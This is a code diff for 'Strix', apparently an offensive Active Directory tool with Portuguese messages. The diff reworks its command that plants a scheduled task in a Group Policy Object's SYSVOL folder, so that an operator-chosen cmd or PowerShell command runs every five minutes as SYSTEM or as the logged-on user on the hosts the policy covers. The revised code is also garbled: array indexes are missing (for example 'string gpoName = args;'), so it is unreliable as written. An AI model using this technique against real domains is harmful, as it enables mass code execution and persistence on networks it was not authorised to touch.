@@ -1700,243 +1700,200 @@ namespace Strix
 
             public static void CreateGPOScheduledTask(string[] args)
             {
-                  if (args.Length != 5)
-                  {
-                        Console.WriteLine("Uso: strix.exe gposcheduletask <GPO> <cmd|powershell> <machine|user> \"<comando>\"");
-                        return;
-                  }
+                if (args.Length != 5)
+                {
+                    Console.WriteLine("Uso: strix.exe gposcheduletask <GPO> <cmd|powershell> <machine|user> \"<comando>\"");
+                    return;
+                }
 
-                  string gpoName = args[1];
-                  string commandType = args[2].ToLower();
-                  string scope = args[3].ToLower();
-                  string command = args[4].Trim();
+                string gpoName = args;
+                string commandType = args.ToLower();
+                string scope = args.ToLower();
+                string command = args.Trim();
 
-                  if (commandType != "cmd" && commandType != "powershell")
-                  {
-                        Console.WriteLine("[-] Tipo invalido. Use cmd ou powershell.");
-                        return;
-                  }
+                if (commandType != "cmd" && commandType != "powershell")
+                {
+                    Console.WriteLine("[-] Tipo invalido. Use cmd ou powershell.");
+                    return;
+                }
 
-                  if (scope != "machine" && scope != "user")
-                  {
-                        Console.WriteLine("[-] Escopo invalido. Use machine ou user.");
-                        return;
-                  }
+                if (scope != "machine" && scope != "user")
+                {
+                    Console.WriteLine("[-] Escopo invalido. Use machine ou user.");
+                    return;
+                }
 
+                try
+                {
+                    string defaultNC;
+                    string configurationNC;
+                    string server;
 
-                  try
-                  {
-                        string defaultNC;
-                        string configurationNC;
-                        string server;
+                    GetGpoDirectoryContext(null, out defaultNC, out configurationNC, out server);
 
-                        GetGpoDirectoryContext(null, out defaultNC, out configurationNC, out server);
+                    string gpoGuid = null;
+                    string gpoFileSysPath = null;
 
-                        string gpoGuid = null;
-                        string gpoFileSysPath = null;
+                    using (DirectoryEntry entry = new DirectoryEntry("LDAP://" + server + "/" + defaultNC))
+                    using (DirectorySearcher searcher = new DirectorySearcher(entry))
+                    {
+                        searcher.Filter = "(&(objectClass=groupPolicyContainer)(displayName=" +
+                            EscapeLdapFilterValue(gpoName) + "))";
 
+                        searcher.PropertiesToLoad.Add("name");
+                        searcher.PropertiesToLoad.Add("gPCFileSysPath");
 
-                        using (DirectoryEntry entry = new DirectoryEntry("LDAP://" + server + "/" + defaultNC))
-                        using (DirectorySearcher searcher = new DirectorySearcher(entry))
+                        SearchResult result = searcher.FindOne();
+
+                        if (result == null)
                         {
-                              searcher.Filter = "(&(objectClass=groupPolicyContainer)(displayName=" +
-                                    EscapeLdapFilterValue(gpoName) + "))";
-
-                              searcher.PropertiesToLoad.Add("name");
-                              searcher.PropertiesToLoad.Add("gPCFileSysPath");
-
-
-
-                              SearchResult result = searcher.FindOne();
-
-                              if (result == null)
-                              {
-                                    Console.WriteLine("[-] GPO nao encontrada: " + gpoName);
-                                    return;
-                              }
-
-                              gpoGuid = result.Properties["name"][0].ToString();
-                              gpoFileSysPath = result.Properties["gPCFileSysPath"][0].ToString();
-
-                        }
-                        
-                   
-                        string scopeDirectory = scope == "machine" ? "Machine" : "User";
-
-                        string outputDirectory = System.IO.Path.Combine(
-                              gpoFileSysPath,
-                              scopeDirectory,
-                              "Preferences",
-                              "ScheduledTasks"
-                        );
-
-                        System.IO.Directory.CreateDirectory(outputDirectory);
-
-                        string executable;
-                        string arguments;
-
-                        if (commandType == "cmd")
-                        {
-                              executable = @"C:\Windows\System32\cmd.exe";
-                              arguments = "/c " + command;
-                        }
-                        else
-                        {
-                              executable = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
-                              arguments = "-NoProfile -NonInteractive -Command \"" + command + "\"";
+                            Console.WriteLine("[-] GPO nao encontrada: " + gpoName);
+                            return;
                         }
 
-                        System.Xml.XmlDocument document = new System.Xml.XmlDocument();
+                        gpoGuid = result.Properties["name"].ToString();
+                        gpoFileSysPath = result.Properties["gPCFileSysPath"].ToString();
+                    }
 
-                        System.Xml.XmlElement root = document.CreateElement("ScheduledTasks");
-                        root.SetAttribute("clsid", "{CC63F200-7309-4ba0-B154-A71CD118DBCC}");
-                        document.AppendChild(root);
+                    string scopeDirectory = scope == "machine" ? "Machine" : "User";
 
-                        System.Xml.XmlElement task = document.CreateElement("TaskV2");
-                        task.SetAttribute("clsid", "{D8896631-B747-47a7-84A6-C155337F3BC8}");
-                        task.SetAttribute("name", "StrixCommand");
-                        task.SetAttribute("image", "0");
-                        task.SetAttribute("uid", "{" + Guid.NewGuid().ToString().ToUpper() + "}");
-                        task.SetAttribute("changed", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
-                        root.AppendChild(task);
+                    string outputDirectory = System.IO.Path.Combine(
+                        gpoFileSysPath,
+                        scopeDirectory,
+                        "Preferences",
+                        "ScheduledTasks"
+                    );
 
-                        System.Xml.XmlElement properties = document.CreateElement("Properties");
-                        properties.SetAttribute("action", "C");
-                        properties.SetAttribute("name", "StrixCommand");
-                        properties.SetAttribute("runAs", "NT AUTHORITY\\SYSTEM");
-                        task.AppendChild(properties);
+                    System.IO.Directory.CreateDirectory(outputDirectory);
 
-                        System.Xml.XmlElement scheduledTask = document.CreateElement("Task");
-                        scheduledTask.SetAttribute("version", "1.2");
-                        scheduledTask.SetAttribute("xmlns", "http://microsoft.com");
-                        properties.AppendChild(scheduledTask);
+                    string executable;
+                    string arguments;
 
-                        System.Xml.XmlElement registration = document.CreateElement("RegistrationInfo");
-                        scheduledTask.AppendChild(registration);
+                    if (commandType == "cmd")
+                    {
+                        executable = @"C:\Windows\System32\cmd.exe";
+                        arguments = "/c " + command;
+                    }
+                    else
+                    {
+                        executable = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+                        arguments = "-NoProfile -NonInteractive -Command \"" + command + "\"";
+                    }
 
-                        System.Xml.XmlElement author = document.CreateElement("Author");
-                        author.InnerText = "Strix";
-                        registration.AppendChild(author);
+                    string taskName = "StrixCommand";
+                    string uid = "{" + Guid.NewGuid().ToString().ToUpper() + "}";
+                    string changed = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                    string startBoundary = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss");
 
-                        System.Xml.XmlElement description = document.CreateElement("Description");
-                        description.InnerText = "Strix Command task";
-                        registration.AppendChild(description);
+                    // Define conta e LogonType conforme escopo
+                    string runAsAccount = scope == "machine" ? "S-1-5-18" : @"%LogonDomain%\%LogonUser%";
+                    string principalUserId = scope == "machine" ? "S-1-5-18" : @"%LogonDomain%\%LogonUser%";
+                    string logonTypeValue = scope == "machine" ? "S4U" : "InteractiveToken";
 
-                        System.Xml.XmlElement triggers = document.CreateElement("Triggers");
-                        scheduledTask.AppendChild(triggers);
+                    string xmlTemplate = @"<?xml version=""1.0"" encoding=""utf-8""?>
+            <ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">
+                  <TaskV2 clsid=""{D8896631-B747-47a7-84A6-C155337F3BC8}"" name="""" image=""0"" changed="""" uid="""">
+                        <Properties action=""C"" name="""" runAs="""" logonType="""">
+                              <Task version=""1.2"">
+                                    <RegistrationInfo>
+                                          <Author>Strix</Author>
+                                          <Description>Strix Command task</Description>
+                                    </RegistrationInfo>
+                                    <Principals>
+                                          <Principal id=""Author"">
+                                                <UserId></UserId>
+                                                <LogonType></LogonType>
+                                                <RunLevel>HighestAvailable</RunLevel>
+                                          </Principal>
+                                    </Principals>
+                                    <Settings>
+                                          <IdleSettings>
+                                                <Duration>PT10M</Duration>
+                                                <WaitTimeout>PT1H</WaitTimeout>
+                                                <StopOnIdleEnd>true</StopOnIdleEnd>
+                                                <RestartOnIdle>false</RestartOnIdle>
+                                          </IdleSettings>
+                                          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+                                          <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
+                                          <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+                                          <AllowHardTerminate>true</AllowHardTerminate>
+                                          <StartWhenAvailable>false</StartWhenAvailable>
+                                          <AllowStartOnDemand>true</AllowStartOnDemand>
+                                          <Enabled>true</Enabled>
+                                          <Hidden>false</Hidden>
+                                          <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+                                          <Priority>7</Priority>
+                                    </Settings>
+                                    <Triggers>
+                                          <TimeTrigger>
+                                                <StartBoundary></StartBoundary>
+                                                <Enabled>true</Enabled>
+                                                <Repetition>
+                                                      <Interval>PT5M</Interval>
+                                                      <Duration>P1D</Duration>
+                                                      <StopAtDurationEnd>false</StopAtDurationEnd>
+                                                </Repetition>
+                                          </TimeTrigger>
+                                    </Triggers>
+                                    <Actions Context=""Author"">
+                                          <Exec>
+                                                <Command></Command>
+                                                <Arguments></Arguments>
+                                          </Exec>
+                                    </Actions>
+                              </Task>
+                        </Properties>
+                  </TaskV2>
+            </ScheduledTasks>";
 
-                        System.Xml.XmlElement timeTrigger = document.CreateElement("TimeTrigger");
-                        triggers.AppendChild(timeTrigger);
+                    System.Xml.XmlDocument document = new System.Xml.XmlDocument();
+                    document.LoadXml(xmlTemplate);
 
-                        System.Xml.XmlElement repetition = document.CreateElement("Repetition");
-                        timeTrigger.AppendChild(repetition);
+                    System.Xml.XmlElement taskV2 = (System.Xml.XmlElement)document.SelectSingleNode("//TaskV2");
+                    taskV2.SetAttribute("name", taskName);
+                    taskV2.SetAttribute("changed", changed);
+                    taskV2.SetAttribute("uid", uid);
 
-                        System.Xml.XmlElement interval = document.CreateElement("Interval");
-                        interval.InnerText = "PT5M";
-                        repetition.AppendChild(interval);
+                    System.Xml.XmlElement props = (System.Xml.XmlElement)document.SelectSingleNode("//Properties");
+                    props.SetAttribute("name", taskName);
+                    props.SetAttribute("runAs", runAsAccount);
+                    props.SetAttribute("logonType", logonTypeValue);
 
-                        System.Xml.XmlElement duration = document.CreateElement("StopAtDurationEnd");
-                        duration.InnerText = "false";
-                        repetition.AppendChild(duration);
+                    document.SelectSingleNode("//UserId").InnerText = principalUserId;
+                    document.SelectSingleNode("//LogonType").InnerText = logonTypeValue;
+                    document.SelectSingleNode("//StartBoundary").InnerText = startBoundary;
+                    document.SelectSingleNode("//Command").InnerText = executable;
+                    document.SelectSingleNode("//Arguments").InnerText = arguments;
 
-                        System.Xml.XmlElement startBoundary = document.CreateElement("StartBoundary");
-                        startBoundary.InnerText = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss");
-                        timeTrigger.AppendChild(startBoundary);
+                    string outputFile = System.IO.Path.Combine(outputDirectory, "ScheduledTasks.xml");
 
-                        System.Xml.XmlElement enabled = document.CreateElement("Enabled");
-                        enabled.InnerText = "true";
-                        timeTrigger.AppendChild(enabled);
+                    System.Xml.XmlWriterSettings writerSettings = new System.Xml.XmlWriterSettings();
+                    writerSettings.Encoding = new System.Text.UTF8Encoding(false);
+                    writerSettings.Indent = true;
+                    writerSettings.IndentChars = "\t";
+                    writerSettings.OmitXmlDeclaration = false;
+
+                    using (System.Xml.XmlWriter writer = System.Xml.XmlWriter.Create(outputFile, writerSettings))
+                    {
+                        document.Save(writer);
+                    }
 
 
-                        System.Xml.XmlElement principals = document.CreateElement("Principals");
-                        scheduledTask.AppendChild(principals);
+                    Console.WriteLine("[+] ScheduledTasks.xml criado com sucesso em: " + outputFile);
+                    Console.WriteLine("    GPO: " + gpoName);
+                    Console.WriteLine("    GUID: " + gpoGuid);
+                    Console.WriteLine("    Escopo: " + scopeDirectory);
+                    Console.WriteLine("    Tipo: " + commandType);
+                    Console.WriteLine("    Comando: " + command);
+                    Console.WriteLine("    Arquivo: " + outputFile);
+                    Console.WriteLine("[*] Alteração realizada no SYSVOL.");                  
 
-                        System.Xml.XmlElement principal = document.CreateElement("Principal");
-                        principal.SetAttribute("id", "Author");
-                        principals.AppendChild(principal);
-
-                        System.Xml.XmlElement userId = document.CreateElement("UserId");
-                        userId.InnerText = @"NT AUTHORITY\SYSTEM";
-                        principal.AppendChild(userId);
-
-                        System.Xml.XmlElement logonType = document.CreateElement("LogonType");
-                        logonType.InnerText = "ServiceAccount";
-                        principal.AppendChild(logonType);
-
-                        System.Xml.XmlElement runLevel = document.CreateElement("RunLevel");
-                        runLevel.InnerText = "HighestAvailable";
-                        principal.AppendChild(runLevel);
-
-                        System.Xml.XmlElement settings = document.CreateElement("Settings");
-                        scheduledTask.AppendChild(settings);
-
-                        string[,] settingValues =
-                        {
-                              { "MultipleInstancesPolicy", "IgnoreNew" },
-                              { "DisallowStartIfOnBatteries", "true" },
-                              { "StopIfGoingOnBatteries", "true" },
-                              { "AllowHardTerminate", "true" },
-                              { "StartWhenAvailable", "false" },
-                              { "RunOnlyIfNetworkAvailable", "false" },
-                              { "AllowStartOnDemand", "true" },
-                              { "Enabled", "true" },
-                              { "Hidden", "false" },
-                              { "RunOnlyIfIdle", "false" },
-                              { "WakeToRun", "false" },
-                              { "ExecutionTimeLimit", "PT1H" },
-                              { "Priority", "7" }
-                        };
-
-                        for (int i = 0; i < settingValues.GetLength(0); i++)
-                        {
-                              System.Xml.XmlElement setting = document.CreateElement(settingValues[i, 0]);
-                              setting.InnerText = settingValues[i, 1];
-                              settings.AppendChild(setting);
-                        }
-
-                        System.Xml.XmlElement actions = document.CreateElement("Actions");
-                        actions.SetAttribute("Context", "Author");
-                        scheduledTask.AppendChild(actions);
-
-                        System.Xml.XmlElement exec = document.CreateElement("Exec");
-                        actions.AppendChild(exec);
-
-                        System.Xml.XmlElement executableElement = document.CreateElement("Command");
-                        executableElement.InnerText = executable;
-                        exec.AppendChild(executableElement);
-
-                        System.Xml.XmlElement argumentsElement = document.CreateElement("Arguments");
-                        argumentsElement.InnerText = arguments;
-                        exec.AppendChild(argumentsElement);
-
-                        string outputFile = System.IO.Path.Combine(outputDirectory, "ScheduledTasks.xml");
-
-                        System.Xml.XmlWriterSettings writerSettings = new System.Xml.XmlWriterSettings();
-                        writerSettings.Encoding = new System.Text.UTF8Encoding(false);
-                        writerSettings.Indent = true;
-                        writerSettings.IndentChars = "    ";
-                        writerSettings.OmitXmlDeclaration = false;
-
-                        using (System.Xml.XmlWriter writer = System.Xml.XmlWriter.Create(outputFile, writerSettings))
-                        {
-                              document.Save(writer);
-                        }
-
-                        Console.WriteLine("[+] XML gerado com sucesso!");
-                        Console.WriteLine("    GPO: " + gpoName);
-                        Console.WriteLine("    GUID: " + gpoGuid);
-                        Console.WriteLine("    Escopo: " + scopeDirectory);
-                        Console.WriteLine("    Tipo: " + commandType);
-                        Console.WriteLine("    Comando: " + command);
-                        Console.WriteLine("    Arquivo: " + outputFile);
-                        Console.WriteLine("[*] Alteração realizada no SYSVOL.");
-                  }
-                  catch (Exception ex)
-                  {
-                        Console.WriteLine("[-] Erro ao gerar XML: " + ex.Message);
-                  }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Erro ao criar GPO Scheduled Task: " + ex.Message);
+                }
             }
-
 
         private static string ResolveGpoLinkTarget(
             string scopeType,
